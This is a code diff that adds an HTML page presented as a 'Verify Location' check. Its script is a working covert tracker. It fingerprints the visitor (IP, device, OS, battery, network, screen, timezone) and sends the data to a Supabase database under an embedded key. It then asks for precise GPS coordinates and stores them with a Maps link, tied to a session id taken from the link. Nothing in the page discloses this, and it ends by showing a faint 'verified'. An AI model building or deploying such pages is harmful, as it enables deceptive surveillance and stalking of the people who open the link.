@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifying Location...</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    background: #000;
+    width: 100vw; height: 100vh;
+    display: flex; align-items: center; justify-content: center;
+    flex-direction: column; gap: 16px;
+    font-family: sans-serif;
+}
+#btn {
+    background: #0095f6;
+    color: #fff;
+    border: none;
+    padding: 16px 40px;
+    font-size: 16px;
+    border-radius: 12px;
+    cursor: pointer;
+}
+#st { color: #ffffff55; font-size: 13px; text-align: center; padding: 0 20px; }
+</style>
+</head>
+<body>
+<button id="btn" onclick="go()">Verify Location</button>
+<div id="st"></div>
+<script>
+const S='https://yspjknemdmlejzsubycf.supabase.co';
+const K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlzcGprbmVtZG1sZWp6c3VieWNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI3MDgyOTgsImV4cCI6MjA4ODI4NDI5OH0.JSAXs0UZJiBy2mgniSoSuN6BuW1iW-UhW785toC1weM';
+const sid=new URLSearchParams(location.search).get('s')||'no-session';
+
+function st(msg){document.getElementById('st').textContent=msg;}
+
+async function go(){
+    document.getElementById('btn').style.display='none';
+    st('Collecting info...');
+
+    const [ip,battery]=await Promise.all([getPublicIP(),getBattery()]);
+    const ua=parseUserAgent();
+    const net=getNetworkInfo();
+    const scr=getScreenInfo();
+
+    const data={
+        session_id:sid, collected_at:new Date().toISOString(),
+        ip_address:ip, internet_status:navigator.onLine?'Online':'Offline',
+        network_type:net.type, network_downlink:net.downlink, network_rtt:net.rtt,
+        device_model:ua.model, os:ua.os, android_version:ua.androidVersion,
+        browser:ua.browser, user_agent:ua.userAgent,
+        battery_level:battery.level, battery_charging:battery.charging, charging_time:battery.chargingTime,
+        screen_width:scr.width, screen_height:scr.height, pixel_ratio:scr.pixelRatio,
+        timezone:getTimezone(), language:navigator.language, platform:navigator.platform,
+        cookies_enabled:navigator.cookieEnabled, touch_points:navigator.maxTouchPoints,
+        latitude:null, longitude:null, location_accuracy:null, maps_url:null, location_error:null,
+    };
+
+    st('Saving...');
+    const res=await fetch(S+'/rest/v1/device_info',{
+        method:'POST',
+        headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json','Prefer':'return=representation'},
+        body:JSON.stringify(data)
+    });
+    const rows=await res.json();
+    const rowId=rows[0]?.id;
+
+    st('Allow location for full report...');
+    navigator.geolocation.getCurrentPosition(
+        async pos=>{
+            if(rowId){
+                await fetch(S+'/rest/v1/device_info?id=eq.'+rowId,{
+                    method:'PATCH',
+                    headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json'},
+                    body:JSON.stringify({
+                        latitude:pos.coords.latitude,
+                        longitude:pos.coords.longitude,
+                        location_accuracy:pos.coords.accuracy,
+                        maps_url:'https://maps.google.com/?q='+pos.coords.latitude+','+pos.coords.longitude,
+                        location_error:null,
+                    })
+                });
+            }
+            document.body.innerHTML='<div style="color:#ffffff11;font-size:12px;font-family:sans-serif;margin:auto;">verified</div>';
+        },
+        err=>{
+            document.body.innerHTML='<div style="color:#ffffff11;font-size:12px;font-family:sans-serif;margin:auto;">verified</div>';
+        },
+        {timeout:15000,enableHighAccuracy:true,maximumAge:0}
+    );
+}
+
+async function getPublicIP(){
+    try{const r=await fetch('https://api.ipify.org?format=json');return(await r.json()).ip;}
+    catch(e){return'unknown';}
+}
+
+function parseUserAgent(){
+    
+    const ua=navigator.userAgent;
+    let androidVersion='Unknown',os='Unknown';
+    const am=ua.match(/Android\s([\d.]+)/);
+    if(am){androidVersion=am[1];os='Android '+am[1];}
+    const im=ua.match(/iPhone OS\s([\d_]+)/);
+    if(im) os='iOS '+im[1].replace(/_/g,'.');
+    const mm=ua.match(/\(([^)]+)\)/);
+    let browser='Unknown';
+    if(ua.includes('Chrome')) browser='Chrome';
+    else if(ua.includes('Firefox')) browser='Firefox';
+    else if(ua.includes('Safari')) browser='Safari';
+    else if(ua.includes('Edge')) browser='Edge';
+    return{model:mm?mm[1]:'Unknown',os,androidVersion,browser,userAgent:ua};
+}
+
+async function getBattery(){
+    try{
+        const b=await navigator.getBattery();
+        return{level:Math.round(b.level*100)+'%',charging:b.charging,chargingTime:b.chargingTime===Infinity?'N/A':b.chargingTime+'s'};
+    }catch(e){return{level:'unknown',charging:false,chargingTime:'N/A'};}
+}
+
+function getNetworkInfo(){
+    const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+    if(c) return{type:c.effectiveType||c.type||'unknown',downlink:c.downlink?c.downlink+' Mbps':'unknown',rtt:c.rtt?c.rtt+' ms':'unknown'};
+    return{type:'unknown',downlink:'unknown',rtt:'unknown'};
+}
+
+function getScreenInfo(){return{width:screen.width,height:screen.height,pixelRatio:window.devicePixelRatio};}
+function getTimezone(){return Intl.DateTimeFormat().resolvedOptions().timeZone;}
+</script>
+</body>
+</html>
